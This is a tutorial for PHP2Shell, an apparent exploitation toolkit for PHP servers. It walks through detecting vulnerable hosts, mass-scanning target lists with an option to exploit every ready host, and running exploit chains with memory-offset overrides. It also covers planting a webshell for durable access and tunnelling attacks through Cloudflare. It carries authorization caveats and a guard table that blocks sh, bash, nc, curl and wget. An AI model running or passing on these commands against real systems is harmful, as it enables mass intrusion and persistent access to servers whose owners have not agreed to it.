# PHP2Shell — Tutorial

A walk-through of the toolkit from detection to (authorized) exploitation. Every step here assumes you are on a target you own or have written authorization to test.

## 0. Install

```bash
bash install.sh
php2shell.py version
```

You should see the banner, the chain sha256, the fix-floor map, and the stealth status. If stealth says `urllib fallback`, install `curl_cffi` (`pip install curl_cffi`) — without it the toolkit is far easier to fingerprint.

## 1. Detect one target (non-destructive)

```bash
php2shell.py detect -u http://127.0.0.1:8088/ --ja3 chrome
```

Output: verdict (`vulnerable` / `patched` / `eol` / `unknown`), PHP version (if leaked), `upload_progress`, `display_errors`, and any OOM-probe signals. Nothing destructive is sent — the OOM probe uses at most 4 requests (1 control + 3 escalating probes), no retries.

## 2. Preflight — readiness score

```bash
php2shell.py preflight http://127.0.0.1:8088/
```

A 0–90 score with per-check notes and hard blockers. Two things hard-block an exploit:

1. The target is unreachable.
2. The version reads as **already patched** (>= fix-floor).

Everything else (unknown version behind a CDN, `upload_progress` off, `display_errors` off) is a *signal*, not a blocker — the chain still runs. `display_errors=off` is neutral because this toolkit leaks via the `Set-Cookie` header, not error output.

## 3. Mass scan

```bash
# targets.txt — one URL per line, # = comment, blank = skip
echo "http://127.0.0.1:8088/" > targets.txt
echo "https://lab.example.com/" >> targets.txt
php2shell.py scan -l targets.txt --json out/report.json --csv out/report.csv
```

Add `--exploit` to also run the chain on every READY target (with confirmation):

```bash
php2shell.py scan -l targets.txt --exploit --yes --chain pure --cmd 'id>/out/p1'
```

## 4. Run a chain (authorized target only)

```bash
php2shell.py exploit http://127.0.0.1:8088/ --chain pure --cmd 'id>/out/p1'
```

The CLI re-runs detect + preflight, refuses if not READY, asks for confirmation, then dispatches the `pure` chain via `lib/chain.py`. The chain sha256 is printed so you always know exactly what executed.

Chain choice:

| `--chain` | When |
|---|---|
| `pure` (default) | production target — `display_errors=Off`, `memory_limit=128M`, chunked bypass |
| `remote` | small-memory target (`memory_limit=8M`), `display_errors=On` |
| `local` | you have the PHP binary locally (var_destroy UAF) |
| `mismatch` | per-directory `php_serialize` vs `php` session handler |

Override offsets if the build is not bookworm:

```bash
php2shell.py exploit http://t/ --chain remote \
    --zif-offset 0x465370 --dtor-offset 0x65eb60 --htdata-offset 0x690d8
```

Or read them from a `libphp.so`:

```bash
php2shell.py exploit http://t/ --chain remote --libphp /path/to/libphp.so
```

## 5. Generate a safe webshell (add-on)

After a successful exploit, you may want durable access. The generator produces a shell that, if left on the server, is **not** an open door:

```bash
php2shell.py shell --out out --ttl 24
# -> out/<32hex>.php  (mode 600)
# -> out/CREDENTIALS.txt  (mode 600 — NEVER commit)
```

Properties: 32-hex unguessable filename, bcrypt password (cost 12), command whitelist (no free shell), TTL auto-unlink, audit log. No `eval`, no uploader, no reverse shell. For the browser-login variant:

```bash
python3 shell/web_shell_gen.py --out out --ttl 24 --variant web
```

## 6. Lab

```bash
cd lab
docker compose up --build -d                       # lab profile (8M, display_errors=On)
docker compose --profile production up --build -d  # production profile (128M, Off)
```

See `lab/README.md` for the port map and how to read the proof file at `/out/p1`.

## 7. Tunnel (Cloudflare)

The raw-socket chains speak HTTP; Cloudflare tunnels speak HTTPS. `exploit/tunnel_proxy.py` bridges them:

```bash
python3 exploit/tunnel_proxy.py --url https://your-tunnel.trycloudflare.com --port 8089
# then in another terminal:
python3 exploit/pure_off.py --host 127.0.0.1 --port 8089 --auto
```

---

## Guard reference

| Guard | Where enforced |
|---|---|
| Exploit only on READY + confirm | `php2shell.py` cmd_exploit / cmd_scan |
| Command max 14 bytes | `lib/exploit_runner.validate_command` |
| No shell chaining (`; \| & $ \` > <`) | `lib/exploit_runner.FORBIDDEN_CMD_TOKENS` |
| `--revshell` does not exist | not in argparse; `FORBIDDEN_FLAGS` in runner |
| Whitelist bounded (no sh/bash/nc/curl/wget/chmod/rm) | `lib/exploit_runner.set_allowed_cmds` |
| Proof-redirect only `/out/<name>` | `PROOF_REDIRECT_RE` |
